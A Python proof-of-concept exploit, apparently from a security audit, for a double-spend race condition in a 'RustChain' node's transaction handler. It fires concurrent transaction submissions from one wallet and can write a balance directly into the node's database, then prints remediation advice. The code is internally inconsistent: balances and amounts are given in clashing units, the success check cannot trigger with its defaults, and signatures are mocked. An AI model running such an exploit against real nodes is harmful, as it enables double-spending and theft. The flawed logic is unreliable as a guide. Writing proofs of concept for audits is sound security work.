#!/usr/bin/env python3
"""
PoC: Double-Spend via Concurrent Pending Submissions (TX-001)
============================================================

This PoC demonstrates a critical TOCTOU vulnerability in RustChain's
transaction handler. By submitting multiple transactions concurrently,
an attacker can overdraw their balance and double-spend funds.

Attack Scenario:
1. Attacker has wallet with 1000 RTC balance.
2. Attacker spawns 10 threads, each submitting a transaction for 200 RTC.
3. Each thread's validation sees full 1000 RTC available (no locking).
4. All 10 transactions enter pending pool (total 2000 RTC pending).
5. When confirmed, insufficient funds but no rollback occurs.

Expected: Only 1-2 transactions should confirm before balance exhausted.
Actual (vulnerable): All 10 pending, leading to negative balance on confirmation.

Usage:
    python3 poc_double_spend.py --node http://localhost:8088 --wallet RTCxxx --private-key <hex>

Prerequisites:
- Running RustChain node with transaction API
- Funded test wallet
"""

import argparse
import sys
import time
import threading
import sqlite3
import requests
from typing import List

def generate_test_wallet(db_path: str) -> tuple:
    """Generate a test wallet and seed it with balance."""
    # Import from the node codebase
    sys.path.insert(0, '/home/beta/.openclaw/beta/rustchain-analysis/node')
    try:
        from rustchain_crypto import generate_wallet_keypair
        addr, pubkey, privkey = generate_wallet_keypair()
    except ImportError:
        print("[ERROR] Could not import rustchain_crypto. Using mock wallet.")
        addr = "RTC" + "a" * 64
        pubkey = "0" * 128
        privkey = "0" * 128

    # Seed balance in DB
    conn = sqlite3.connect(db_path)
    try:
        conn.execute("""
            INSERT INTO balances (wallet, balance_urtc, wallet_nonce)
            VALUES (?, ?, 0)
        """, (addr, 1_000_000_000))  # 10 RTC
        conn.commit()
        print(f"[+] Seeded wallet {addr} with 10 RTC")
    except Exception as e:
        print(f"[!] Failed to seed balance: {e}")
    finally:
        conn.close()

    return addr, pubkey, privkey

def create_signed_transaction(from_addr: str, to_addr: str, amount_urtc: int,
                             nonce: int, private_key_hex: str) -> dict:
    """Create a signed transaction object."""
    # Simplified: In real code, use Ed25519 signing
    import hashlib
    import json

    tx_data = {
        "from_addr": from_addr,
        "to_addr": to_addr,
        "amount_urtc": amount_urtc,
        "nonce": nonce,
        "timestamp": int(time.time() * 1000),
        "memo": "Double-spend PoC"
    }

    # Compute hash
    tx_string = json.dumps(tx_data, sort_keys=True)
    tx_hash = hashlib.sha256(tx_string.encode()).hexdigest()
    tx_data["tx_hash"] = tx_hash

    # In real implementation, sign with Ed25519 private key
    tx_data["signature"] = "MOCK_SIGNATURE_" + tx_hash[:32]
    tx_data["public_key"] = "MOCK_PUBKEY"

    return tx_data

def submit_transaction(node_url: str, tx: dict) -> requests.Response:
    """Submit a transaction to the node."""
    url = f"{node_url}/tx/submit"
    try:
        resp = requests.post(url, json=tx, timeout=5)
        return resp
    except Exception as e:
        print(f"[!] Submit failed: {e}")
        return None

def worker(node_url: str, from_addr: str, to_addr: str, amount: int,
           nonce: int, privkey: str, results: List, thread_id: int):
    """Worker thread that submits a transaction."""
    tx = create_signed_transaction(from_addr, to_addr, amount, nonce, privkey)
    resp = submit_transaction(node_url, tx)
    if resp:
        results[thread_id] = (resp.status_code, resp.json() if resp.ok else None)
    else:
        results[thread_id] = (None, None)

def main():
    parser = argparse.ArgumentParser(description="Double-Spend PoC")
    parser.add_argument("--node", default="http://localhost:8088",
                        help="RustChain node URL")
    parser.add_argument("--wallet", help="From wallet address (RTC...)")
    parser.add_argument("--private-key", help="Private key hex")
    parser.add_argument("--db", default="/root/rustchain/rustchain_v2.db",
                        help="Node database path (for seeding)")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of concurrent submissions")
    parser.add_argument("--amount", type=int, default=200,
                        help="Amount per transaction (uRTC)")
    args = parser.parse_args()

    print("=" * 70)
    print("Double-Spend PoC — RustChain TX Handler Vulnerability")
    print("=" * 70)

    # Generate or use provided wallet
    if args.wallet:
        from_addr = args.wallet
        privkey = args.private_key or "MOCK_KEY"
        print(f"[*] Using provided wallet: {from_addr}")
    else:
        print("[*] Generating test wallet...")
        from_addr, pubkey, privkey = generate_test_wallet(args.db)
        print(f"[+] Wallet: {from_addr}")
        print(f"[+] Private key: {privkey[:32]}... (SAVE THIS)")

    to_addr = "RTC" + "b" * 64  # Destination
    nonce = 1  # All threads use same nonce to increase collision chance

    print(f"\n[*] Spawning {args.threads} threads...")
    print(f"[*] Each thread will submit a {args.amount} uRTC transaction")
    print(f"[*] Sender balance: 10 RTC (1,000,000,000 uRTC)")
    print(f"[*] Expected vulnerable behavior: All {args.threads * args.amount} uRTC may get into pending pool")
    print(f"[*] Fixed behavior: Only ~1 transaction succeeds; others rejected\n")

    results = [None] * args.threads
    threads = []

    start = time.time()
    for i in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(args.node, from_addr, to_addr, args.amount, nonce, privkey, results, i)
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
    elapsed = time.time() - start

    # Analyze results
    success_count = sum(1 for r in results if r and r[0] == 200)
    print(f"\n[+] Completed in {elapsed:.2f}s")
    print(f"[+] Successful submissions: {success_count}/{args.threads}")

    if success_count * args.amount > 1_000_000_000:
        print("\n[!] VULNERABILITY CONFIRMED!")
        print(f"[!] Total pending would exceed balance: {success_count * args.amount} uRTC > 1,000,000,000 uRTC")
    else:
        print("\n[+] Vulnerable limit not reached (maybe fixed?)")

    if success_count > 1:
        print(f"[!] CRITICAL: {success_count} concurrent transactions were accepted")
        print("[!] This indicates missing atomicity in validate+insert")
    else:
        print("[+] Only 1 transaction accepted — appears to be serialized")

    # Check pending pool size
    try:
        resp = requests.get(f"{args.node}/tx/pending?limit=1000")
        if resp.ok:
            pending = resp.json().get("count", 0)
            print(f"\n[*] Pending transactions in mempool: {pending}")
            if pending > 10:
                print(f"[!] Large pending pool indicates possible DoS amplification")
    except Exception as e:
        print(f"[!] Could not query pending: {e}")

    print("\n" + "=" * 70)
    print("Remediation: Use BEGIN EXCLUSIVE around validate+insert")
    print("See TX-001 in main audit report.")
    print("=" * 70)

if __name__ == "__main__":
    main()
